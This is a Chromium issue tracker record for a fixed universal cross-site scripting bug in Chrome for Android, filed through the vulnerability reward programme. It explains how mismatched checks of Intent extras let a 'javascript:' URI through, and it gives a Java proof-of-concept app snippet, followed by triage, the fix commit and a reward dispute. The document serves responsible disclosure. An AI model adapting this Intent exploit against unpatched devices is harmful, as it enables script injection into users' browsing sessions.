# UXSS in Chrome for Android

| Field | Value |
|-------|-------|
| **Issue ID** | [493955234](https://issues.chromium.org/issues/493955234) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | UI>Browser>Mobile |
| **Platforms** | Android |
| **Reporter** | ad...@gmail.com |
| **Assignee** | hi...@google.com |
| **Created** | 2026-03-19 |
| **Bounty** | $1,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

---

VULNERABILITY DETAILS

In `shouldIgnoreIntent` method of `IntentHandler` class , externally recieved intent goes through a check to prevent "javascript" and "jar" schemed URI's from being loaded.
[Source](https://source.chromium.org/chromium/chromium/src/+/main:chrome/android/java/src/org/chromium/chrome/browser/IntentHandler.java;drc=2fff3fdd8ba33169c02b49c8ceb92b424f8e9a56;bpv=1;bpt=1;l=934?gsn=shouldIgnoreIntent&gs=KYTHE%3A%2F%2Fkythe%3A%2F%2Fchromium.googlesource.com%2Fcodesearch%2Fchromium%2Fsrc%2F%2Fmain%3Flang%3Djava%3Fpath%3Dorg.chromium.chrome.browser.IntentHandler%23ce31cc235193c27fc38e646fb443a8eceee35ce62ba95499784d6a1b760feab1)

Using `getMultiTabMetadata` method, it checks if the intent contains bundle extra with key `org.chromium.chrome.browser.multi_tab_reparenting_metadata` ; if so, it retrieves it and initializes the class `MultiTabMetadata` with the extras recieved from the bundle.

If the object returned by `getMultiTabMetadata` is not null, then the field `urls` which is an ArrayList goes through for loop and any existence of "javascript" and "jar" based URI's is removed from the list.

After performing sanitization on the `urls`, the method returns false if the list is not empty.
After this method gets executed, control goes to `maybeHandleUrlIntent` method [source](https://source.chromium.org/chromium/chromium/src/+/main:chrome/android/java/src/org/chromium/chrome/browser/ChromeTabbedActivity.java;drc=2fff3fdd8ba33169c02b49c8ceb92b424f8e9a56;bpv=1;bpt=1;l=1871?gsn=maybeHandleUrlIntent&gs=KYTHE%3A%2F%2Fkythe%3A%2F%2Fchromium.googlesource.com%2Fcodesearch%2Fchromium%2Fsrc%2F%2Fmain%3Flang%3Djava%3Fpath%3Dorg.chromium.chrome.browser.ChromeTabbedActivity%236af3e658316262e657859e8674470fd0fe859f8754b8b8a976c40eb7febbef3d).
This method,
instead of checking if the intent has bundle extra with key `org.chromium.chrome.browser.multi_tab_reparenting_metadata` at the beginning, it will check if there is an extra named `org.chromium.chrome.browser.tab_group_metadata` and creates an object of class `TabGroupMetadata` which will be used as a source for loading urls.

The sequence of retrieval of extras differs between `shouldIgnoreIntent` and `maybeHandleUrlIntent`, through which it is possible to include a "javascript:" uri in the arraylist of `TabGroupMetadata` , which won't go through the check.

By passing an extra `com.android.browser.application_id` with the value `com.android.chrome`, the TabOpenType returned by the method `getTabOpenType` will be `CLOBBER_CURRENT_TAB`(value: 3).

In `processUrlViewIntent` method , if the value of TabOpenType is `CLOBBER_CURRENT_TAB`, browser will load it in the current active tab:

```
  Tab currentTab = getActivityTab();
                if (currentTab != null) {
                    RedirectHandlerTabHelper.updateIntentInTab(
                            currentTab, intent, /* isCustomTab= */ false);
                    currentTab.loadUrl(loadUrlParams);
                    resultTab = currentTab;
                } else {
                    resultTab = launchIntent(loadUrlParams, externalAppId, true, intent);
                }
                break;

```

Using the vulnerability which was found out earlier, we can pass in "javascript:" uri which will be executed in the context of the current tab.

VERSION

Chrome Version: 146.0.7680.119 (Stable)
Operating System: Android 16

REPRODUCTION CASE

```
        ArrayList<Integer> mtidkey = new ArrayList<>();
        mtidkey.add(1);
        ArrayList<String> mturlkey = new ArrayList<>();
        mturlkey.add("https://");
        boolean[] mtispinned = {false};
        Bundle bundle = new Bundle();
        bundle.putIntegerArrayList("MultiTabReparentingIdsKey",mtidkey);
        bundle.putChar("MultiTabReparentingIsIncognitoKey",'a');
        bundle.putStringArrayList("MultiTabReparentingUrlsKey",mturlkey);
        bundle.putBooleanArray("MultiTabReparentingIsPinnedKey",mtispinned);
        Map.Entry<Object, Object> entry =
                new SimpleImmutableEntry<>(1, "javascript:alert(document.domain)");
        ArrayList taburl = new ArrayList();
        taburl.add(entry);
        Bundle innerBundle = new Bundle();
        innerBundle.putLong("high",1);
        innerBundle.putLong("low",1);
        Bundle exp = new Bundle();
        exp.putBundle("tabGroupId",innerBundle);
        exp.putSerializable("tabIdsToUrls",taburl);
        exp.putInt("selectedTabId",1);
        exp.putInt("sourceWindowId",1);
        exp.putInt("tabGroupColor",1);
        exp.putBoolean("tabGroupCollapsed",false);
        exp.putBoolean("isGroupShared",true);
        exp.putBoolean("isIncognito",false);
        Intent intent = new Intent();
                intent.putExtra("org.chromium.chrome.browser.tab_group_metadata",exp);
                intent.putExtra("org.chromium.chrome.browser.multi_tab_reparenting_metadata",bundle);
                intent.putExtra("com.android.browser.application_id","com.android.chrome");
                intent.setClassName("com.android.chrome","org.chromium.chrome.browser.ChromeTabbedActivity");
                intent.setAction("org.chromium.chrome.browser.dummy.action");
                Intent launch = new Intent("android.intent.action.VIEW").setData(Uri.parse("https://www.google.com")).setPackage("com.android.chrome");
                startActivity(launch);

                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {

                        startActivity(intent);

                    }
                }, 2000);

```

CREDIT INFORMATION

Reporter credit: Adithya Kotian

## Attachments

- [poc.mp4](attachments/poc.mp4) (video/mp4, 3.0 MB)

## Timeline

### ts...@google.com (2026-03-19)

I'm not going to be able to build out the simulated malicious app above to confirm whether this works or not, but it seems likely based upon the logic. A gemini-generated summary:
If an application receives an Intent and extracts data from it to perform security checks, it must use that exact same data when it executes the action. If it extracts data from Source A for the security check, but later extracts data from Source B for execution, an attacker can supply both.

The Check (shouldIgnoreIntent): This method acts as the security bouncer. It looks for the multi_tab_reparenting_metadata bundle, extracts its URLs, and successfully strips out dangerous javascript: and jar: URIs. If the resulting list isn't empty (e.g., because you included a benign https:// URL), the bouncer approves the Intent.

The Execution (maybeHandleUrlIntent): Once past the bouncer, this method is in charge of loading the URLs. However, it prioritizes the tab_group_metadata bundle over the reparenting bundle. Because shouldIgnoreIntent never sanitized tab_group_metadata, the malicious javascript: URI hidden inside it is processed without question.

### ts...@google.com (2026-03-19)

Severity-medium since you need to have a malicious app installed as a precondtion.

### ts...@google.com (2026-03-19)

CC'ing owners.

### ts...@google.com (2026-03-19)

Assigning per most recent change in the vicinity of that code. 

### ck...@google.com (2026-03-19)

Adding Zhe since I believe this is related to how we handle intents for multi tab and group drag & drop.

### ts...@google.com (2026-03-19)

I believe the code in question lies around https://source.chromium.org/chromium/chromium/src/+/main:chrome/android/java/src/org/chromium/chrome/browser/ChromeTabbedActivity.java;drc=2fff3fdd8ba33169c02b49c8ceb92b424f8e9a56;l=2745


### ts...@google.com (2026-03-19)

Changing owner per offline conversation with Moe.

### dx...@google.com (2026-03-19)

Project: chromium/src  

Branch:  main  

Author:  Hitarth Kothari [hitarthkothari@google.com](mailto:hitarthkothari@google.com)  

Link:    <https://chromium-review.googlesource.com/7685092>

Fix a bug with multi tab handling

---


Expand for full commit details
```
     
    Bug: 493955234 
    Change-Id: Ia8f5bb76074eb473e542fa1927cf96be6379083e 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7685092 
    Auto-Submit: Hitarth Kothari <hitarthkothari@google.com> 
    Reviewed-by: Calder Kitagawa <ckitagawa@chromium.org> 
    Reviewed-by: Zhe Li <zheliooo@google.com> 
    Commit-Queue: Hitarth Kothari <hitarthkothari@google.com> 
    Cr-Commit-Position: refs/heads/main@{#1602213}

```

---

Files:

- M `chrome/android/java/src/org/chromium/chrome/browser/ChromeTabbedActivity.java`
- M `chrome/android/java/src/org/chromium/chrome/browser/IntentHandler.java`

---

Hash: [35c2094329bdcd86e057e5d669b55af8b324f630](https://chromiumdash.appspot.com/commit/35c2094329bdcd86e057e5d669b55af8b324f630)  

Date: Thu Mar 19 20:49:47 2026


---

### hi...@google.com (2026-03-19)

Tested fix locally (By building a malicious app using above script).

### ch...@google.com (2026-03-19)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Security bugs need the Severity (S0-S3) and the Found In set, which will enable the bots to request merges to the correct branches (as well as helping out our vulnerability reward and CVE processes). Please consult with any Chrome security contact ([security@chromium.org](mailto:security@chromium.org)) to arrange to set these labels. Severity guidelines: <https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#severity-guidelines-for-security-issues> FoundIn guidelines: <https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-labels.md#labels-relevant-for-any-type_bug_security>
  After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### es...@chromium.org (2026-03-20)

@hitarthkothari for tracking purposes, can you please comment on whether the bug existed as far back as M145? Thank you!

### ck...@google.com (2026-03-20)

Based on git history this issue dates back to at least [140.0.7311.0](https://chromiumdash.appspot.com/commit/2ce1525f0bd160de8ed88e45818372f54a2c8a35) if not earlier.

### ch...@google.com (2026-03-21)

Setting milestone because of s2 severity.

### ad...@gmail.com (2026-04-27)

A video demonstration of the exploit is attached below.

### ad...@gmail.com (2026-04-29)

Hey,
Can you please take a look at this issue. This issue was reported before changes to VRP was made.
<https://issues.chromium.org/issues/507743677>

### aj...@google.com (2026-06-25)

-> S3 as the precondition of a cooperating app is important.

### sp...@google.com (2026-06-29)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
Web platform privilege escalation.


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ad...@gmail.com (2026-06-30)

Regarding reward decision:
Why does this fall under "Web platform privilege escalation"
This is an UXSS issue. javascript: uri is executed in the context of the currently loaded site.

### ad...@gmail.com (2026-06-30)

Replying to #17:
An old report which required a third-party app as prerequisite was triaged as S2:
See
<https://issues.chromium.org/issues/40063907>

### ch...@google.com (2026-08-04)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/493955234)*
